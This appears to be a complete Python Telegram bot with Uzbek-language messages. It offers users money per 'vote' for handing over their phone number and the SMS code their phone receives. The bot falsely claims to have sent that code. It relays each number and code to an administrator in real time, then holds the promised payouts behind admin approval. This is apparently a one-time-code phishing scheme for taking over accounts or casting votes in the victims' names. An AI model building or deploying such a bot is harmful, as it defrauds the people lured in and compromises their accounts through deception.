import asyncio
import asyncpg
import os
import logging
import re
import random
import string
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
DATABASE_URL = os.getenv("DATABASE_URL")
PORT = int(os.getenv("PORT", 10000))
VOICE_PRICE = int(os.getenv("VOICE_PRICE", 50000))
MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", 100000))
CODE_EXPIRE_MINUTES = int(os.getenv("CODE_EXPIRE_MINUTES", 5))
TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"

if TEST_MODE:
    VOICE_PRICE = 100
    MIN_WITHDRAW = 100

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)],
        [KeyboardButton(text="❌ Bekor qilish")]
    ],
    resize_keyboard=True,
    one_time_keyboard=True
)

user_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🗳️ Ovoz berish")],
        [KeyboardButton(text="💳 Hamyon"), KeyboardButton(text="💰 Balans")],
        [KeyboardButton(text="💸 Yechish")]
    ],
    resize_keyboard=True
)

admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📊 Statistika")],
        [KeyboardButton(text="📨 Barchaga xabar")],
        [KeyboardButton(text="📋 Kutayotgan kodlar")],
        [KeyboardButton(text="💸 Yechish so'rovlari")]
    ],
    resize_keyboard=True
)

# ================= VALIDATSIYA =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            operator_codes = ['90', '91', '93', '94', '95', '97', '98', '99', '88', '33']
            return number[:2] in operator_codes
    
    return False

def generate_sms_code():
    return ''.join(random.choices(string.digits, k=6))

# ================= DATABASE =================
async def get_db():
    try:
        conn = await asyncpg.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"❌ Database ulanishda xatolik: {e}")
        raise

async def init_db():
    conn = None
    try:
        conn = await get_db()
        
        # users jadvali - is_blocked ustuni YO'Q
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
                balance INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # codes jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # verified_phones jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS verified_phones (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) UNIQUE NOT NULL,
                telegram_id BIGINT NOT NULL,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # transactions jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20) DEFAULT 'deposit',
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # withdraws jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                phone VARCHAR(20) NOT NULL,
                amount INTEGER NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Indexlar
        await conn.execute("CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)")
        await conn.execute("CREATE INDEX IF NOT EXISTS idx_codes_status ON codes(status)")
        await conn.execute("CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(telegram_id)")
        await conn.execute("CREATE INDEX IF NOT EXISTS idx_withdraws_status ON withdraws(status)")
        
        logger.info("✅ Database tayyor")
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
        raise
    finally:
        if conn:
            await conn.close()

# ================= DATABASE FUNKSIYALARI =================
async def get_user(telegram_id):
    conn = None
    try:
        conn = await get_db()
        return await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
    finally:
        if conn:
            await conn.close()

async def is_phone_verified(phone):
    conn = None
    try:
        conn = await get_db()
        result = await conn.fetchval(
            "SELECT COUNT(*) FROM verified_phones WHERE phone = $1",
            phone
        )
        return result > 0
    finally:
        if conn:
            await conn.close()

# ================= 1. START =================
@dp.message(Command("start"))
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Xush kelibsiz, Admin!", reply_markup=admin_menu)
        return
    
    conn = None
    try:
        conn = await get_db()
        
        # ✅ HAR QANDAY START BOSGANNI users jadvaliga qo'shish
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO NOTHING",
            telegram_id, "no_phone_yet"
        )
        
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        # Agar telefoni bo'lmasa yoki 'no_phone_yet' bo'lsa
        if user['phone'] == "no_phone_yet" or user['phone'] is None:
            user_states[telegram_id] = "waiting_phone"
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = {VOICE_PRICE:,} SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ {VOICE_PRICE:,} so'm olasiz!\n\n"
                f"⚡️ <b>Tez va oson!</b>\n"
                f"💎 <b>Kafolatlangan to'lov!</b>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>\n"
                f"(Kontakt tugmasi yoki qo'lda yozing)",
                reply_markup=phone_keyboard
            )
        else:
            # Telefoni bor (to'liq ro'yxatdan o'tgan)
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {user['phone']}\n"
                f"💰 <b>Balans:</b> {user['balance']:,} so'm\n\n"
                f"🎁 <b>Yana ovoz bering va yana {VOICE_PRICE:,} so'm oling!</b>\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=user_menu
            )
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
    finally:
        if conn:
            await conn.close()

# ================= 2. OVOZ BERISH =================
@dp.message(F.text == "🗳️ Ovoz berish")
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    # Allaqachon ovoz berganmi?
    user = await get_user(telegram_id)
    if user and user['phone'] != "no_phone_yet" and await is_phone_verified(user['phone']):
        await message.answer(
            "❌ Siz allaqachon ovoz bergansiz!\n"
            "Bu raqam bilan boshqa ovoz bera olmaysiz.",
            reply_markup=user_menu
        )
        return
    
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        f"🗳️ <b>OVOZ BERISH</b>\n\n"
        f"💰 1 ta ovoz = {VOICE_PRICE:,} so'm\n\n"
        f"📱 Telefon raqamingizni yuboring:\n"
        f"(Kontakt tugmasi yoki qo'lda yozing)",
        reply_markup=phone_keyboard
    )

# ================= 3. TELEFON RAQAM (Kontakt) =================
@dp.message(F.contact)
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
        return
    
    phone = message.contact.phone_number
    await process_phone(message, phone)

# ================= BEKOR QILISH =================
@dp.message(F.text == "❌ Bekor qilish")
async def cancel_action(message: types.Message):
    telegram_id = message.from_user.id
    
    user_states.pop(telegram_id, None)
    user_phones.pop(telegram_id, None)
    withdraw_states.pop(telegram_id, None)
    
    await message.answer("✅ Bekor qilindi", reply_markup=user_menu)

# ================= 4. TELEFON RAQAM (Qo'lda) =================
@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    # Raqam ishlatilganmi?
    if await is_phone_verified(phone):
        await message.answer(
            "❌ Bu telefon raqami allaqachon ishlatilgan!\n"
            "Boshqa raqam kiriting:",
            reply_markup=phone_keyboard
        )
        return
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    conn = None
    try:
        conn = await get_db()
        # ✅ Telefon raqamini yangilash (no_phone_yet dan haqiqiy raqamga)
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
    except Exception as e:
        logger.error(f"❌ Foydalanuvchini saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    # SMS kod yaratish
    sms_code = generate_sms_code()
    
    # Test rejimida kodni ko'rsatish
    if TEST_MODE:
        await message.answer(
            f"🧪 <b>TEST REJIMI</b>\n"
            f"📱 Telefon: {phone}\n"
            f"🔑 SMS Kod: <code>{sms_code}</code>\n\n"
            f"Iltimos, ushbu kodni kiriting:"
        )
    else:
        await message.answer(
            f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
            f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:"
        )
    
    # Kodni saqlash
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, sms_code, telegram_id
        )
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 SMS Kod: <code>{sms_code}</code>\n"
            f"⏳ Kod kutilmoqda...",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")

# ================= 5. KODNI QABUL QILISH =================
@dp.message(lambda message: user_states.get(message.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    await message.answer(
        "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
        reply_markup=user_menu
    )
    
    try:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ To'g'ri kod", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
                InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
            ]
        ])
        
        await bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 Kod: <code>{code}</code>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
    
    user_states[telegram_id] = "done"

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = None
        try:
            conn = await get_db()
            
            # Kodni tasdiqlash
            await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            # Telefon raqamni tasdiqlanganlar ro'yxatiga qo'shish
            await conn.execute(
                "INSERT INTO verified_phones (phone, telegram_id) VALUES ($1, $2) ON CONFLICT (phone) DO NOTHING",
                phone, telegram_id
            )
            
            # Balansga pul qo'shish
            await conn.execute(
                "UPDATE users SET balance = balance + $1 WHERE telegram_id = $2",
                VOICE_PRICE, telegram_id
            )
            
            # Tranzaksiya qo'shish
            await conn.execute(
                "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, 'deposit', 'Ovoz berish uchun')",
                telegram_id, VOICE_PRICE
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                    f"💰 Hisobingizga <b>+{VOICE_PRICE:,} so'm</b> qo'shildi!",
                    reply_markup=user_menu,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TASDIQLANDI!</b>\n\n"
                f"🆔 ID: {telegram_id}\n"
                f"📞 Tel: {phone}\n"
                f"💰 +{VOICE_PRICE:,} so'm",
                parse_mode="HTML"
            )
            await callback.answer("✅ Tasdiqlandi!")
            
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE codes SET status = 'rejected' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod noto'g'ri!\n\nQaytadan: 🗳️ Ovoz berish",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n🆔 ID: {telegram_id}",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()

# ================= 7. HAMYON / BALANS =================
@dp.message(F.text.in_(["💳 Hamyon", "💰 Balans"]))
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        # Telefon raqami yo'q bo'lsa
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        await message.answer(
            f"💳 <b>Hamyon</b>\n\n"
            f"💰 Balans: {user['balance']:,} so'm\n\n"
            f"💸 Yechish uchun kamida {MIN_WITHDRAW:,} so'm kerak.",
            reply_markup=user_menu,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 8. YECHISH =================
@dp.message(F.text == "💸 Yechish")
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        # Telefon raqami yo'q bo'lsa
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        balance = user['balance']
        
        if balance == 0:
            await message.answer("❌ Hisobingizda mablag' yo'q!", reply_markup=user_menu)
            return
        
        if balance < MIN_WITHDRAW:
            await message.answer(
                f"❌ Balans: {balance:,} so'm\n"
                f"💰 Yechish uchun {MIN_WITHDRAW:,} so'm kerak!\n"
                f"Yana {MIN_WITHDRAW - balance:,} so'm kerak.",
                reply_markup=user_menu
            )
            return
        
        withdraw_states[telegram_id] = "waiting_withdraw_phone"
        await message.answer(
            f"💰 Balans: {balance:,} so'm\n\n"
            f"📱 Telefon raqamingizni yuboring:"
        )
        
    except Exception as e:
        logger.error(f"❌ Yechish xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 9. YECHISH TELEFON =================
@dp.message(lambda message: withdraw_states.get(message.from_user.id) == "waiting_withdraw_phone")
async def withdraw_phone(message: types.Message):
    telegram_id = message.from_user.id
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer("❌ Noto'g'ri format! Masalan: +998901234567")
        return
    
    normalized_phone = normalize_phone(phone)
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Foydalanuvchi topilmadi!", reply_markup=user_menu)
            withdraw_states.pop(telegram_id, None)
            return
        
        balance = user['balance']
        
        if balance < MIN_WITHDRAW:
            await message.answer(f"❌ Balans yetarli emas! Kerak: {MIN_WITHDRAW:,} so'm", reply_markup=user_menu)
            withdraw_states.pop(telegram_id, None)
            return
        
        # Yechish so'rovini saqlash
        await conn.execute(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) "
            "VALUES ($1, $2, $3, 'pending')",
            telegram_id, normalized_phone, balance
        )
        
        # Balansni nolga tushirish
        await conn.execute(
            "UPDATE users SET balance = 0 WHERE telegram_id = $1",
            telegram_id
        )
        
        # Tranzaksiya qo'shish
        await conn.execute(
            "INSERT INTO transactions (telegram_id, amount, type, description) VALUES ($1, $2, 'withdraw', 'Pul yechish')",
            telegram_id, balance
        )
        
        await message.answer(
            f"✅ So'rov qabul qilindi!\n"
            f"💰 Summa: {balance:,} so'm\n"
            f"📱 Tel: {normalized_phone}",
            reply_markup=user_menu
        )
        
        try:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
                    InlineKeyboardButton(text="❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
                ]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"💸 <b>YECHISH SO'ROVI</b>\n\n"
                f"🆔 ID: <code>{telegram_id}</code>\n"
                f"📱 Tel: <code>{normalized_phone}</code>\n"
                f"💰 Summa: <code>{balance:,} so'm</code>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
        
        withdraw_states.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Yechish telefon xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 10. ADMIN YECHISH =================
@dp.callback_query(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[1]
    
    if action == "done":
        telegram_id = int(data[2])
        amount = int(data[3])
        
        conn = None
        try:
            conn = await get_db()
            
            # Yechishni tasdiqlash
            await conn.execute(
                "UPDATE withdraws SET status = 'completed' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n💰 Summa: {amount:,} so'm",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(f"✅ To'landi!\n💰 {amount:,} so'm")
            await callback.answer("✅ To'landi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[2])
        
        conn = None
        try:
            conn = await get_db()
            
            # Yechishni rad etish va pulni qaytarish
            await conn.execute(
                "UPDATE withdraws SET status = 'rejected' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            # Pulni qaytarish
            withdraw = await conn.fetchrow(
                "SELECT amount FROM withdraws WHERE telegram_id = $1 AND status = 'rejected' ORDER BY id DESC LIMIT 1",
                telegram_id
            )
            
            if withdraw:
                await conn.execute(
                    "UPDATE users SET balance = balance + $1 WHERE telegram_id = $2",
                    withdraw['amount'], telegram_id
                )
            
            try:
                await bot.send_message(telegram_id, "❌ So'rov rad etildi!\n💰 Pul balansga qaytarildi.", reply_markup=user_menu)
            except:
                pass
            
            await callback.message.edit_text(f"❌ Rad etildi!\nID: {telegram_id}")
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()

# ================= 11. ADMIN STATISTIKA =================
@dp.message(F.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        total_users = await conn.fetchval("SELECT COUNT(*) FROM users")
        registered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
        unregistered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        verified_phones = await conn.fetchval("SELECT COUNT(*) FROM verified_phones")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        pending_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 Jami foydalanuvchilar: {total_users}\n"
            f"✅ Ro'yxatdan o'tganlar: {registered_users}\n"
            f"⏳ Telefon kiritmaganlar: {unregistered_users}\n"
            f"📱 Tasdiqlangan raqamlar: {verified_phones}\n"
            f"💰 Jami balans: {total_balance:,} so'm\n"
            f"⏳ Kutayotgan kodlar: {pending}\n"
            f"✅ Tasdiqlangan kodlar: {verified}\n"
            f"💸 Yechish so'rovlari: {pending_withdraws}",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 12. KUTAYOTGAN KODLAR =================
@dp.message(F.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"🆔 ID: <code>{c['telegram_id']}</code>\n"
                text += f"📞 Tel: <code>{c['phone']}</code>\n"
                text += f"🔑 Kod: <code>{c['code']}</code>\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 13. YECHISH SO'ROVLARI =================
@dp.message(F.text == "💸 Yechish so'rovlari")
async def pending_withdraws(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        withdraws = await conn.fetch(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"🆔 ID: <code>{w['telegram_id']}</code>\n"
                text += f"📱 Tel: <code>{w['phone']}</code>\n"
                text += f"💰 Summa: <code>{w['amount']:,} so'm</code>\n"
                text += f"📅 Vaqt: {w['created_at']}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 14. BARCHAGA XABAR =================
@dp.message(F.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer(
        "📨 Xabar matnini yozing:\n"
        "❌ Bekor qilish uchun 'Bekor' deb yozing."
    )

@dp.message(lambda message: message.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    text = message.text
    
    if text.lower() == "bekor":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("✅ Bekor qilindi", reply_markup=admin_menu)
        return
    
    admin_states.pop(ADMIN_ID, None)
    
    conn = None
    try:
        conn = await get_db()
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        sent = 0
        for user in users:
            try:
                await bot.send_message(user['telegram_id'], f"📨 {text}")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
                pass
        
        await message.answer(f"✅ Yuborildi: {sent} ta foydalanuvchiga", reply_markup=admin_menu)
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 15. BALANS KOMANDASI =================
@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        await message.answer(f"💰 Balans: {user['balance']:,} so'm", reply_markup=user_menu)
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 16. ADMIN MENU =================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Admin panel", reply_markup=admin_menu)

# ================= HTTP SERVER (RENDER UCHUN) =================
